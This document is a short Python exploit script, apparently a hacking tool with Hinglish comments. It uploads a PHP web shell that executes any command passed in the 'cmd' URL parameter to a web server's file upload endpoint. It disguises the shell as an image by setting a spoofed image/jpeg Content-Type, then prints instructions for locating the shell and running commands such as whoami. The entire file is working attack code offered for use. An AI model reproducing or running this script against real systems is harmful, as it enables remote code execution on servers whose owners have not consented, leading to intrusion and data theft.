import requests
import sys

def exploit_upload(target_url):
    print(f"\n[*] Bhai, initializing RCE File Upload bypass for: {target_url}")
    
    # THE HACKER'S WEB SHELL
    # Yeh PHP code server par execute hoga aur hamari Linux commands run karega
    shell_code = "<?php echo '<b>SUDOSAMMI_RCE_SUCCESS</b><br>'; system($_GET['cmd']); ?>"
    shell_name = "sudosammi_shell.php"
    
    print("[*] Crafting malicious Web Shell (PHP)...")
    
    # THE BYPASS TRICK
    # Hum server ko file bhej rahe hain, naam .php hai, par MIME Type (Content-Type) image/jpeg bata rahe hain!
    # Format: 'input_name': ('file_name', 'file_content', 'content_type')
    files = {
        'file': (shell_name, shell_code, 'image/jpeg') 
    }
    
    # Ek form submit button ka data bhi bhej rahe hain (mostly required hota hai)
    data = {
        'submit': 'Upload'
    }
    
    print(f"[*] Attempting to bypass filters and upload {shell_name}...")
    
    try:
        # POST request se file upload kar rahe hain
        response = requests.post(target_url, files=files, data=data, timeout=10)
        
        if response.status_code == 200:
            print("\n[+] BOOM! 🎯 Upload request went through successfully!")
            print("[!] The server accepted our PHP shell disguised as an image.")
            print("\n--- NEXT STEPS FOR HACKER ---")
            print("1. Find where the file is stored (e.g., /uploads/sudosammi_shell.php)")
            print("2. Open it in browser: http://target.com/uploads/sudosammi_shell.php?cmd=whoami")
            print("3. Enjoy your Remote Code Execution!")
        else:
            print(f"\n[-] Server rejected the request. Status Code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"\n[-] Arre yaar, connection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 rce_uploader.py <upload_endpoint_url>")
        print("Example: python3 rce_uploader.py http://testphp.vulnweb.com/upload.php")
        sys.exit(1)
        
    target = sys.argv[1]
    exploit_upload(target)
